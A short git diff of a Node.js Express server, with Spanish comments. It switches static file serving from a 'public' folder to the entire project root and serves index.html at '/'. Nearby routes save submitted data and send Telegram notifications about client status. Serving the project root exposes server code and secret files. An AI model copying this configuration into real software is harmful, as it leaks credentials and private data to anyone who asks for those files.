@@ -93,13 +93,15 @@ async function editTelegram(messageId, clienteId, nuevoEstado) {
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, 'public')));
+
+// Servir archivos estáticos desde la raíz (donde está index.html e img/)
+app.use(express.static(__dirname));
 
 // ─── Rutas ──────────────────────────────────────────────────────────────────
 
-// GET / → sirve login.html
+// GET / → sirve index.html
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'login.html'));
+  res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 // POST /submit → guardar datos + notificar Telegram
